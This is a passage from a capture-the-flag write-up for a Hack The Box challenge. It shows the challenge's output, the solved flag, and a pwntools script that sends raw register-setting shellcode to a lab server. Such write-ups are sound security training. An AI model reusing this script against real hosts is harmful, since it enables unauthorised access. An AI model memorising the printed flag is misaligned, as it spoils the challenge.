⠀⠀⢰⠃⠀⡤⠀⣿⣀⠀⢀⠏⠀⠀⠀⢠⠎⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡔⠀⠀⠀⠀⣸⠇⠀⢠⠀⠠⡇⠀
⠀⠀⡏⢀⠎⠀⠀⢻⡟⣦⡜⠀⠀⠀⢀⠏⠀⢠⣐⠤⠒⠁⠀⠀⠀⠀⠀⢀⡴⠋⢀⡀⠀⠀⣠⢿⠀⢀⡞⠀⠀⣧⠀
⠀⢸⣷⠋⠀⢠⠃⠸⣿⣜⠃⠆⠀⠀⣎⡴⠖⠉⠀⠀⠀⠀⠀⠀⠀⢀⣴⣋⠴⠖⠉⢀⡀⣠⣫⠇⠀⠸⠃⠀⠀⣿⡄
⢠⡿⠁⠀⢠⠟⠀⢀⣿⣿⣸⡇⠀⣼⠉⠀⠀⠀⠀⠀⡀⠀⠀⠀⠴⠋⣉⡴⠄⢀⡴⠋⣰⣿⠟⠀⠀⠀⠀⠀⣸⣿⡇
⢸⠇⠀⡰⠃⠀⠀⣼⣿⣿⠋⠉⠓⠫⠿⢿⠒⠒⠚⠯⠥⠤⠦⠭⠵⠾⠯⢤⡺⠿⠗⠚⣿⣿⠀⠀⠀⠀⠀⢠⢿⢽⡗
⠀⠀⠀⠀⠀⠘⡿⣿⣿⡟⠙⠲⢤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⢰⣿⣿⣄⣀⠀⠀⠀⣼⣿⡿⠃
⠀⠀⠀⠀⠀⠀⠀⠀⢈⠀⠀⠀⠀⠀⠒⠉⠙⠛⠭⣅⣉⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢘⡛⠛⠛⠀⠀⠀⠀⠁⠉⠀⠀

[*] Initializing components...

[-] Error: Misaligned components!

[*] If you intend to fix them, type "fix": fix

[!] Carefully place all the components:
HTB{r3c0n5truct_d3m_r3g5_304b5c3c6210fb9303a89d09855bc761}
```
<br>

**THE FLAG: HTB{r3c0n5truct_d3m_r3g5_304b5c3c6210fb9303a89d09855bc761}**

<br>
<br>

The final `payload.py`:

```python
from pwn import *

# Remote connection details
host = "94.237.50.250"
port = 54813

# Payload to send after 'ts: '
payload = b'\x49\xc7\xc0\xde\xc0\x37\x13\x49\xb9\xef\xbe\xad\xde\x00\x00\x00\x00\x49\xba\x37\x13\xad\xde\x00\x00\x00\x00\x49\xc7\xc4\xfe\xca\x37\x13\x49\xbd\xde\xc0\xef\xbe\x00\x00\x00\x00\x49\xc7\xc6\x37\x13\x37\x13\x49\xc7\xc7\xad\xde\x37\x13' + b'\xc3' * 25

# Connect to the remote host
conn = remote(host, port)

# Wait for 'x": ' and send "fix"
output = conn.recvuntil(b'x": ')
print(output.decode())
conn.sendline(b'fix')

# Wait for 'ts: ' and send the payload
output = conn.recvuntil(b'ts: ')
print(output.decode())
conn.send(payload)

output = conn.recv()
print(output.decode())

```











